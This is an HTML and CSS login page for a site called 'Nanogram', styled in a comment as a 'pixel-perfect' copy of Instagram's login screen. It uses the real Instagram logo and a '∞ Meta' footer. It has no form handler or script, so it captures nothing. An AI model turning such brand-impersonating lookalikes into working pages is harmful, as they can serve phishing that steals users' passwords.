<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Nanogram — Login</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');

    :root {
      --bg: #0f1113;
      --card: #0f1719;
      --muted: #9aa4ad;
      --input: #14181a;
      --accent: #1e90ff;
      --outline: rgba(255, 255, 255, 0.08);
      --glass: rgba(255, 255, 255, 0.02);
    }

    * {
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
    }

    body {
      margin: 0;
      font-family: Inter, system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial;
      background: linear-gradient(180deg, #0c0f10 0%, #0f1315 100%);
      color: #e6eef4;
      -webkit-font-smoothing: antialiased;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 28px;
    }

    .frame {
      width: 100%;
      max-width: 420px;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 28px 20px;
    }

    .topbar {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 32px;
    }

    .lang {
      color: var(--muted);
      font-size: 14px;
    }

    .center {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 12px;
    }

    .logo-wrap {
      width: 88px;
      height: 88px;
      border-radius: 22px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 24px;
    }

    .brand {
      font-weight: 600;
      letter-spacing: 0.12em;
      color: #e6eef4;
      margin-bottom: 18px;
      text-align: center;
    }

    .card {
      width: 100%;
      background: rgba(255, 255, 255, 0.03);
      border-radius: 22px;
      padding: 24px;
      border: 1px solid rgba(255, 255, 255, 0.06);
      backdrop-filter: blur(8px);
    }

    .inputs {
      display: flex;
      flex-direction: column;
      gap: 14px;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 16px;
      border-radius: 12px;
      border: 1px solid rgba(255, 255, 255, 0.04);
      background: var(--input);
      color: #e6eef4;
      font-size: 15px;
      outline: none;
    }

    input::placeholder {
      color: var(--muted);
    }

    .btn {
      width: 100%;
      padding: 14px;
      border-radius: 28px;
      border: none;
      font-weight: 600;
      font-size: 16px;
      cursor: pointer;
    }

    .btn-primary {
      background: linear-gradient(90deg, #1987ff, #2fb3ff);
      color: #fff;
    }

    .forgot {
      text-align: center;
      color: var(--muted);
      margin-top: 12px;
    }

    .create {
      width: 100%;
      margin-top: 28px;
      padding: 12px;
      border-radius: 28px;
      border: 1.6px solid rgba(47, 179, 255, 0.18);
      text-align: center;
      color: #78b9ff;
      font-weight: 600;
    }

    .meta {
      margin-top: auto;
      color: var(--muted);
      font-size: 13px;
      display: flex;
      justify-content: center;
    }

    /* Responsive improvements */
    @media (max-width: 420px) {
      body {
        padding: 16px;
      }
      .logo-wrap {
        margin-bottom: 16px;
        transform: scale(0.9);
      }
      .topbar {
        margin-bottom: 20px;
      }
      .card {
        padding: 16px;
      }
    }

    @media (min-width: 768px) {
      .frame {
        padding-top: 60px;
      }
      .card {
        padding: 24px;
      }
    }

    /* Accessibility improvements */
    input:focus {
      border-color: var(--accent);
      box-shadow: 0 0 0 2px rgba(30, 144, 255, 0.3);
    }

    button:focus {
      outline: 3px solid rgba(30, 144, 255, 0.4);
    }
  .sr-only { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0, 0, 0, 0); white-space: nowrap; border: 0; }
  .exact-instagram {
      background: rgba(255,255,255,0.04);
      border-radius: 12px;
      padding: 22px;
      border: 1px solid rgba(255,255,255,0.1);
      box-shadow: 0 2px 12px rgba(0,0,0,0.25);
    }

    input[type="text"], input[type="password"] {
      background: rgba(255,255,255,0.06);
      border: 1px solid rgba(255,255,255,0.12);
      height: 46px;
      font-size: 15px;
    }

    .insta-btn {
      border-radius: 10px;
      background: #0095f6;
      font-size: 15px;
      height: 44px;
    }

    .insta-create {
      margin-top: 24px;
      border-radius: 12px;
      border: 1px solid rgba(255,255,255,0.15);
      padding: 14px;
      text-align: center;
      color: #0095f6;
      font-weight: 600;
    }

    .insta-meta {
      margin-top: 32px;
      font-size: 12px;
      opacity: 0.6;
    }
  /* PIXEL-PERFECT INSTAGRAM LOGIN UI */

    body {
      background: #121212;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: flex-start;
    }

    .frame {
      width: 100%;
      max-width: 380px;
      padding-top: 48px;
    }

    .logo-wrap img {
      width: 86px;
      height: 86px;
    }

    .brand {
      font-size: 18px;
      margin-top: 6px;
      letter-spacing: 0.08em;
    }

    .exact-instagram {
      border-radius: 12px;
      padding: 20px 20px 26px;
      border: 1px solid rgba(255,255,255,0.10);
      background: rgba(255,255,255,0.03);
      box-shadow: none;
    }

    input[type="text"], input[type="password"] {
      height: 42px;
      background: #121212;
      border: 1px solid rgba(255,255,255,0.15);
      border-radius: 6px;
      font-size: 14px;
      padding-left: 12px;
    }

    .insta-btn {
      height: 38px;
      border-radius: 8px;
      background: #0095f6;
      font-size: 14px;
      margin-top: 4px;
    }

    .forgot {
      font-size: 12px;
      margin-top: 14px;
      color: #b3cad9;
    }

    .insta-create {
      border-radius: 10px;
      padding: 12px;
      width: 100%;
      font-size: 14px;
      margin-top: 30px;
      border-color: rgba(255,255,255,0.12);
    }

    .insta-meta {
      text-align: center;
      margin-top: 40px;
      font-size: 11px;
      opacity: 0.5;
    }
  </style>
</head>
<body>
  <div class="frame">

    <div class="topbar">
      <div class="lang">English (US) ▾</div>
    </div>

    <div class="center">
      <div class="logo-wrap">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" alt="Nanogram Logo" width="96" height="96" />
      </div>
    </div>

    <div class="brand">Nanogram</div>

    <div class="card exact-instagram" role="form" aria-label="Login form">
      <div class="inputs">
        <input type="text" placeholder="Username, email or mobile number" aria-label="Username, email or mobile number" />
        <input type="password" placeholder="Password" aria-label="Password" />
        <button class="btn btn-primary insta-btn">Log in</button>
      </div>

      <div class="forgot">Forgot password?</div>
    </div>

    <div class="create insta-create">Create new account</div>

    <div class="meta insta-meta">∞ Meta</div>
  </div>
</body>
</html>
